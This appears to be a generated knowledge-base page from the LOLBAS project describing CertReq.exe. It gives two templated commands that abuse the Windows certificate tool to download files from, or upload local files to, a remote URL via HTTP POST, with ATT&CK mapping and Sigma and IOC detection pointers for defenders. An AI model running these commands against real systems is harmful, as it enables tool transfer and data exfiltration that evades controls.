---
title: "CertReq.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Certreq.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "CertReq.exe"
functions:
  - "Download"
  - "Upload"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# CertReq.exe

Used for requesting and managing certificates

## Metadata

- Category: OSBinaries
- Created: 2020-07-07
- Author: David Middlehurst
- Source Path: yml/OSBinaries/Certreq.yml

## Paths

- `C:\Windows\System32\certreq.exe`
- `C:\Windows\SysWOW64\certreq.exe`

## Commands

### 1. Download

Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).

```cmd
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 2. Upload

Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.

```cmd
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
```

- Use Case: Upload
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
- IOC: certreq creates new files
- IOC: certreq makes POST requests

## Resources

- {'Link': 'https://dtm.uk/certreq'}

## Acknowledgements

- {'Person': 'David Middlehurst', 'Handle': '@dtmsecurity'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml)
